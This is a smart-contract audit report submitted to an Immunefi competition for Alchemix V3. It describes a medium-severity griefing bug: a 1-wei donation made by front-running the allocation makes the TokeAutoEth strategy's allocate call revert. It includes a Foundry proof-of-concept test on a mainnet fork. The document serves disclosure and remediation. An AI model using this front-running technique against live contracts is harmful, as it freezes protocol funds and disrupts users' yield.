# 58181 sc medium a griefer can cause a permanent dos in tokeautoeth tokeautousdcstrategy allocate&#x20;

**Submitted on Oct 31st 2025 at 07:36:38 UTC by @aman for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58181
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Temporary freezing of funds for at least 24 hour
  * Contract fails to deliver promised returns, but doesn't lose value
  * Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

In the `TokeAuto` allocation we use `router::depositMax`, which attempts to pull the entire token balance from the strategy contract but we only approve the exact amount intended for the current allocation. If the strategy’s balance exceeds the approved amount, `depositMax` will revert. An attacker could exploit this to cause a permanent or prolonged DoS by donating to the strategy and repeatedly triggering the revert.

## Vulnerability Details

When allocating into `TokeAuto` we use the `router` contract and call its `depositMax` function:

```solidity
/v3-poc/src/strategies/mainnet/TokeAutoEth.sol:56
56:     function _allocate(uint256 amount) internal override returns (uint256) {
57:         require(
58:             TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount,
59:             "Strategy balance is less than amount"
60:         );
61:         TokenUtils.safeApprove(address(weth), address(router), amount);
62:         uint256 shares = router.depositMax(autoEth, address(this), 0);
63:         TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
64:         rewarder.stake(address(this), shares);
```

We only `approve` the exact amount intended for the current allocation, so the router can pull only that approved amount from the strategy contract. However, inside `router::depositMax` the implementation may attempt to pull the strategy’s entire balance up to `maxDeposit`:

```solidity
    function depositMax(
        IAutopool vault,
        address to,
        uint256 minSharesOut
    ) public payable override returns (uint256 sharesOut) {
        IERC20 asset = IERC20(vault.asset());
        uint256 assetBalance = asset.balanceOf(msg.sender);
        uint256 maxDeposit = vault.maxDeposit(to);
        uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
        pullToken(asset, amount, address(this));
    ...
    }
```

Concretely: if the strategy balance is 100 WETH but the allocation amount (and thus the approved amount) is 99 WETH, `depositMax` can revert. An attacker can weaponize this by donating a tiny amount `1 wei` to the strategy right before an allocation front-running the allocate transaction to trigger a revert.

## Impact Details

A single 1-wei donation can be exploited to halt allocations to `TokeAutoETH/TokeAutoUSDC`, causing prolonged disruption of yield operations and exposing the protocol to financial risk.

## References

TokeAutoEth : <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>

TokeAutoUSDStrategy : <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoUSDStrategy.sol>

AutopilotRouter : <https://vscode.blockscan.com/ethereum/0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21>

## Proof of Concept

## Proof of Concept

Step-by-step POC explanation:

1. Admin attempts to allocate **40 WETH** to the `TokeAutoEth` strategy.
2. Attacker watches the allocation transaction in the mempool.
3. Attacker front-runs the allocation and donates **1 wei** to the strategy.
4. When the admin’s allocation executes, it reverts because only **40 WETH** was approved but the strategy balance is now **40 WETH + 1 wei**.
5. Inside the call flow, `router::depositMax` attempts to pull the strategy’s entire balance, causing the revert.

Add following File `POC.t.sol` to `test/strategies` dir:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
// Adjust these imports to your layout

import {TokeAutoEthStrategy} from "src/strategies/mainnet/TokeAutoEth.sol";
import {BaseStrategyTest} from "../libraries/BaseStrategyTest.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";
import {MYTStrategy} from "../../MYTStrategy.sol";
import {AlchemistAllocator} from "../../AlchemistAllocator.sol";
import {MockAlchemistAllocator} from "../mocks/MockAlchemistAllocator.sol";
import {IERC4626Like} from "src/strategies/mainnet/TokeAutoEth.sol";
import {IVaultV2} from "../../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {console} from "forge-std/console.sol";
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}


contract MockTokeAutoEthStrategy is TokeAutoEthStrategy {
    constructor(
        address _myt,
        StrategyParams memory _params,
        address _autoEth,
        address _router,
        address _rewarder,
        address _weth,
        address _oracle,
        address _permit2Address
    ) TokeAutoEthStrategy(_myt, _params, _autoEth, _router, _rewarder, _weth, _oracle, _permit2Address) {}
}



contract POCTest is BaseStrategyTest {
    address public constant TOKE_AUTO_ETH_VAULT = 0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant MAINNET_PERMIT2 = 0x000000000022d473030f1dF7Fa9381e04776c7c5;
    address public constant AUTOPILOT_ROUTER = 0x37dD409f5e98aB4f151F4259Ea0CC13e97e8aE21;
    address public constant REWARDER = 0x60882D6f70857606Cdd37729ccCe882015d1755E;
    address public constant ORACLE = 0x61F8BE7FD721e80C0249829eaE6f0DAf21bc2CaC;

    function getStrategyConfig() internal pure override returns (IMYTStrategy.StrategyParams memory) {
        return IMYTStrategy.StrategyParams({
            owner: address(1),
            name: "TokeAutoEth",
            protocol: "TokeAutoEth",
            riskClass: IMYTStrategy.RiskClass.MEDIUM,
            cap: 10_000e18,
            globalCap: 1e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1
        });
    }

    function getTestConfig() internal pure override returns (TestConfig memory) {
        return TestConfig({vaultAsset: WETH, vaultInitialDeposit: 1000e18, absoluteCap: 10_000e18, relativeCap: 1e18, decimals: 18});
    }

    function createStrategy(address vault, IMYTStrategy.StrategyParams memory params) internal override returns (address) {
        return address(new MockTokeAutoEthStrategy(vault, params, TOKE_AUTO_ETH_VAULT, AUTOPILOT_ROUTER, REWARDER, WETH, ORACLE, MAINNET_PERMIT2));
    }

    function getForkBlockNumber() internal pure override returns (uint256) {
        return 23688417;
    }

    function getRpcUrl() internal view override returns (string memory) {
        return vm.envString("MAINNET_RPC_URL");
    }
  
    function test_strategy_allocation() public {
        address attacker = makeAddr("Attacker");
        deal(testConfig.vaultAsset, attacker, 1e18);
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        IVaultV2(vault).setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(strategy)));
        IVaultV2(vault).addAdapter(address(strategy));
        vm.stopPrank();
        uint256 amountToAllocate = 40e18; 
        deal(testConfig.vaultAsset, strategy, amountToAllocate);
        vm.startPrank(attacker);
        IERC20(WETH).transfer(address(strategy), 1); // Attacker front runs the allocate call and donate 1 WEI to strategy
        vm.stopPrank();
        vm.startPrank(admin);
        MockAlchemistAllocator(allocator).allocate(address(strategy), amountToAllocate); // the strategy has 40e18 WETH
        vm.stopPrank();

    }
}

```

Run the test case with command : `forge test --mc POCTest --match-test test_strategy_allocation -vvv --decode-internal`
